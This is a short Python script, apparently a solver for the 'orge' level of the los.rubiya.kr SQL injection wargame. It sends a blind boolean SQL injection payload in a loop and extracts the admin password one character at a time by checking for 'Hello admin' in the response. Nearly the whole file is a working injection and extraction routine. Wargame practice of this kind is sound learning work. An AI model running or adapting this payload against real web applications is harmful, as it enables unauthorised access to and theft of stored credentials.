#!/usr/bin/py
#-*-coding:utf-8 -*-

import requests

pw=""

for i in range(1,9):
  for j in range(33,128): # ascii code로 변환할 chr() 함수로 전달할 파라미터 값
    try:
      url="https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php?pw=1' || id='admin' %26%26 substr(pw, " + str(i) + ", 1)='" + chr(j)
      result = requests.post(url, cookies=(dict(PHPSESSID="세션값")))
    except:
      print("Error...")
      continue
    if 'Hello admin' in result.text:
      pw = pw + chr(j)
      print("pw : " + pw)
      break